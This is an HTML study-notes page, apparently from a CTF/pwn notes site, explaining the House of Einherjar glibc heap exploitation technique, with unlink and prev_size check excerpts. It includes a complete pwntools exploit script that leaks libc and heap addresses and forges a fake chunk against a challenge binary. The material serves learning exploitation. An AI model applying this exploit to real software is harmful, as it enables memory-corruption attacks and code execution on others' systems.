<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title># House of Einherjar,House of Einherjar</title>
    <link rel="stylesheet" href="../../../../assets/css/notes.min.css">
</head>
<body>
    <div id="header-placeholder"></div>
    <div class="main-content-wrapper">
        <main class="content">
            <h1>House of Einherjar</h1>
<h2>1.基本原理</h2>
<p>引用一下：house of einherjar 是一种堆利用技术，由 Hiroki Matsukuma 提出。该堆利用技术可以强制使得 malloc 返回一个几乎任意地址的 chunk 。其主要在于滥用 free 中的后向合并操作（合并低地址的 chunk），从而使得尽可能避免碎片化</p>
<p>即利用了 off by one 进行一字节的溢出，修改下一个堆块的 prev_size（在 use 状态下与前一个 chunk 是共享该区域的）和 PREV_INUSE 比特位，滥用 free 中的后向合并操作，从而实现 chunk 任意地址分配</p>
<p>因为 free 时会进行 unlink 操作，所以还需要绕过 unlink 的检查</p>
<p>unlink的基本检查：</p>
<ul>
<li>
<p>size大小的检查（glibc-2.26之后）：</p>
<pre><code class="language-c">if (__builtin_expect(chunksize(P) != prev_size(next_chunk(P)), 0))
	malloc_printerr(&quot;corrupted size vs. prev_size&quot;);
</code></pre>
<p>那么要使</p>
<pre><code class="language-c">fake_chunk_prev_size1 = fake_size
</code></pre>
</li>
<li>
<p>指针的检查：</p>
<pre><code class="language-c">if (__builtin_expect(FD-&gt;bk != P || BK-&gt;fd != P, 0))
    malloc_printerr(check_action, &quot;corrupted double-linked list&quot;, P, AV);
</code></pre>
<p>那么要使</p>
<pre><code class="language-c">fake_chunk-&gt;fd = &amp;fake_chunk
fake_chunk-&gt;bk = &amp;fake_chunk
</code></pre>
</li>
<li>
<p>glibc-2.29 起加入了 prevsize 的检查，house of einherjar 必须确保 fake chunk 的 fake_size 等于 chunk2 的 fake_prev_size2</p>
<pre><code class="language-c">/* consolidate backward */
if (!prev_inuse(p)) {
  prevsize = prev_size (p);
  size += prevsize;
  p = chunk_at_offset(p, -((long) prevsize));
  if (__glibc_unlikely (chunksize(p) != prevsize))
    malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);
  unlink_chunk (av, p);
}
</code></pre>
</li>
</ul>
<p><img src="/0101/PWN/堆利用/House/assets/2.House_of_Einherjar/image-20250803221844706.png" alt="image-20250803221844706"></p>
<h2>2.利用思路</h2>
<p>在glibc2.23的环境下：</p>
<pre><code class="language-python">from pwn import *

elf_path = './pwn'
libc_path = './libc.so.6'
elf = ELF(elf_path)
libc = ELF(libc_path)
context(arch=elf.arch, os=elf.os, log_level=&quot;debug&quot;)
# context.terminal = ['tmux','splitw','-h']
ip = '8.147.135.93'
port = 37051

local = 1
if local:
    p = process([elf_path])
else:
    p = remote(ip, port)

# session = ssh(host='node5.buuoj.cn', port=26482, user='CTFMan', password='guest')
# p = session.process(['./vuln'])
#-----------------------------------------------------------------------------------------
it      = lambda                    :p.interactive()
sd      = lambda data               :p.send((data))
sa     	= lambda delim,data         :p.sendafter((delim), (data))
sl      = lambda data               :p.sendline((data))
sla     = lambda delim,data         :p.sendlineafter((delim), (data))
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=False :p.recvuntil(delims, drop)
rl      = lambda                    :p.recvline()
l       = lambda str1               :log.success(str1)
li      = lambda str1,data1         :log.success(str1+' ========&gt; '+hex(data1))
uu32    = lambda data               :u32(data.ljust(4, b&quot;\x00&quot;))
uu64    = lambda data               :u64(data.ljust(8, b&quot;\x00&quot;))
u32Leakbase = lambda offset         :u32(ru(b&quot;\xf7&quot;)[-4:]) - offset
u64Leakbase = lambda offset         :u64(ru(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;)) - offset
#-----------------------------------------------------------------------------------------

def add_chunk(index, size):
    sla(b&quot;choice:\n&quot;, b&quot;1&quot;)
    sla(b&quot;index:\n&quot;, str(index).encode())
    sla(b&quot;size:\n&quot;, str(size).encode())

def delete_chunk(index):
    sla(b&quot;choice:\n&quot;, b&quot;2&quot;)
    sla(b&quot;index:\n&quot;, str(index).encode())

def edit_chunk(index, content):
    sla(b&quot;choice:\n&quot;, b&quot;3&quot;)
    sla(b&quot;index:\n&quot;, str(index).encode())
    sla(b&quot;length:\n&quot;, str(len(content)).encode())
    sa(b&quot;content:\n&quot;, content)

def show_chunk(index):
    sla(b&quot;choice:\n&quot;, b&quot;4&quot;)
    sla(b&quot;index:\n&quot;, str(index).encode())

def exit_p():
    sla(b&quot;choice:\n&quot;, b&quot;5&quot;)

add_chunk(0, 0x208)
add_chunk(1, 0x208)
add_chunk(2, 0xf8)
add_chunk(3, 0x28)

delete_chunk(0)
delete_chunk(2)
show_chunk(0)
libc.address = u64Leakbase(0x39bb78)
li(&quot;libc.address&quot;, libc.address)
edit_chunk(0, b'a'*8)
show_chunk(0)
heap_addr = u64(ru((&quot;\x55&quot;, &quot;\x56&quot;))[-6:].ljust(8, b&quot;\x00&quot;)) - 0x420
li(&quot;heap_addr&quot;, heap_addr)

edit_chunk(0, p64(libc.address + 0x39bb78))
add_chunk(0, 0x200)
add_chunk(2, 0xf8)

fake_chunk = b''
fake_chunk += p64(0)
fake_chunk += p64(0x411)
fake_chunk += p64(heap_addr + 0x10)
fake_chunk += p64(heap_addr + 0x10)
edit_chunk(0, fake_chunk)
edit_chunk(1, b'a' * 0x200 + p64(0x410) + p8(0))

delete_chunk(2)

gdb.attach(p)
pause()
it()
</code></pre>
<p>构造出来的效果：</p>
<p><img src="/0101/PWN/堆利用/House/assets/2.House_of_Einherjar/image-20250325235652201.png" alt="image-20250325235652201"></p>

        </main>
    </div>
    <footer class="footer">
        <p>&copy; 2024 waiwai24. All rights reserved.</p>
    </footer>
    <script src="../../../../assets/js/header.js"></script>
    <script src="../../../../assets/js/include-header.js"></script>
</body>
</html>